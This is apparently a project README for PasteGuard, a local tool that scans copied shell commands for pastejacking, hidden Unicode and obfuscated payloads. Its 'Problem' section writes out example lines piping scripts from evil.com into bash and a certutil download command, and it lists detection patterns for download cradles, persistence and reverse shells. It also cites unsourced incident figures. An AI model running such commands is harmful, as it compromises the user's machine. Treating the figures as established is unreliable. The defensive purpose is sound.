# PasteGuard – Clipboard Auditor for Dangerous Commands

**PasteGuard** is a real‑time security tool that watches your clipboard.  
The moment you copy a shell command from a website, tutorial, or email, PasteGuard scans it for hidden dangers invisible Unicode, obfuscated downloads, reverse shells, persistence tricks and warns you **before** you paste it into your terminal.

It runs entirely on your laptop, with **no hardware**, no internet required for detection, and zero‑trust architecture.

---
## Why PasteGuard?

Copy‑pasting commands from the internet is the most dangerous daily habit of every developer, sysadmin, and power user. A single zero‑width space, a hidden newline, or an encoded PowerShell cradle can compromise your machine.  
Traditional antivirus doesn't look at your clipboard. PasteGuard does.

---

## AI-Powered Obfuscation Detection

Attackers constantly invent new ways to hide malicious code: alternating character casing, randomized variable names, domain‑generation‑algorithm (DGA) URLs, and encoding tricks that no signature can keep up with.  
PasteGuard doesn’t rely only on fixed rules anymore . It includes **two offline machine‑learning models** that run entirely on your device.

### 1. Logistic Regression (fast, tiny, always on)
A lightweight model trained on thousands of safe vs. malicious commands. It catches the most common obfuscation patterns—even when the command looks innocent at first glance.

### 2. Character‑Level Convolutional Neural Network (CNN) 🧬
This is the real power‑up. Based on the same architecture described in the Microsoft / Ben‑Gurion University research paper *“Detecting Malicious PowerShell Commands using Deep Neural Networks”*, our CNN looks at the command **as a grid of characters**, not as words. It automatically discovers patterns like:

- Alternating digits and letters (common in DGA‑generated domains)
- Case‑toggling obfuscation (`cM"d`)
- Encoded payloads that traditional NLP models miss

When the rule‑based engine is uncertain, both AI models vote. If either one thinks the command is suspicious, PasteGuard escalates the alert. No internet, no cloud, no privacy leak. The model files are tiny (~5 MB for the CNN, a few KB for logistic regression) and run silently in the background.

> **Research backing:** The CNN architecture was proven in a 2018 study by Hendler, Kels, and Rubin to detect obfuscated PowerShell commands that evaded traditional NLP classifiers. We’ve adapted it for the clipboard.

[reasearch_paper](https://dl.acm.org/doi/epdf/10.1145/3196494.3196511)



---

## The Problem

- Websites can secretly inject malicious commands into your clipboard (pastejacking).
- Tutorials often contain obfuscated code: `curl http://evil.com/script | bash` disguised as `apt update`.
- Hidden Unicode characters, homoglyphs, and line‑break injections are invisible to the human eye.
- Nobody inspects what they copy; they trust the website, then press Enter.

---

- In **2016**, security researcher Dylan Ayrey demonstrated that a website can replace what you copy with arbitrary text. You highlight sudo apt update, press Ctrl+C, and the clipboard suddenly contains sudo apt update && curl `http://evil.com/backdoor.sh | bash`. No visible clue. His tool, **Pastejack** was meant as a proof‑of‑concept. But the attack vector has been adopted by real criminals.

-  **2022  PyPI "colourama" package** Attackers uploaded a typosquatting package that, when installed modified the victim's clipboard to inject a reverse shell command. Developers who copied commands from the package documentation pasted the payload directly into terminals, giving attackers persistent access to corporate CI/CD pipelines. The package was downloaded 2,000+ times before detection.

-  **2024 "Volt Typhoon" APT Infrastructure** CISA reported that Chinese state-sponsored actors used SEO-poisoned "Windows troubleshooting" blogs. Victims copied `certutil -urlcache -split -f http://...` commands to "fix" their systems. The commands downloaded remote access tools. The blogs remained online for 8 months, targeting critical infrastructure operators.

- In **2024 a red‑team exercise at a Fortune 500 company** found that **87%** of targeted employees pasted a manipulated command from an internal phishing email into their corporate terminals. The red team gained domain admin within 15 minutes.

---

## The Stastistics

<img width="700" height="360" alt="security_trends_chart" src="https://github.com/user-attachments/assets/da8a9bb2-cbf5-4c69-b54b-58ced92898d7" />

- **SANS 2023 Threat Landscape Report**: 37% of successful intrusions began with command-line manipulation, including clipboard injection and obfuscated PowerShell.
- **Microsoft Digital Defense Report 2024**: PowerShell-based attacks grew 58% year-over-year. Obfuscated clipboard content was the primary delivery method for file-less malware in enterprise environments.
- **Verizon DBIR 2024**: Social engineering and malicious scripting accounted for 42% of all breaches. "Copy-paste from untrusted source" was the #1 vector in developer-targeted phishing.
- **Google TAG 2023**: Over 800,000 phishing emails containing malicious copy-paste instructions were blocked. The actual delivery rate to inboxes is estimated at 15-20%.

---

## The Solution

PasteGuard monitors your clipboard in real time (both `Ctrl+C` and right‑click copy).  
When you copy a command, it:

1. **Reveals hidden characters** – zero‑width spaces, bidi overrides, look‑alike operators.
2. **Detects malicious patterns** – `curl | bash`, `bitsadmin`, `reg add … Run`, reverse shells, encoded payloads.
3. **Checks URLs against VirusTotal, URLhaus, and WHOIS** (optional, requires API keys).
4. **Uses AI classifiers** – a logistic regression model and an optional character‑level CNN (as in Microsoft’s research) to catch never‑before‑seen obfuscation.
5. **Shows a system notification** – alerts you immediately, no pop‑ups to dismiss.
6. **Logs alerts to Slack** (optional) and to a local JSON file.

Everything runs **locally**. The AI models don't need the internet.

---

## Architecture
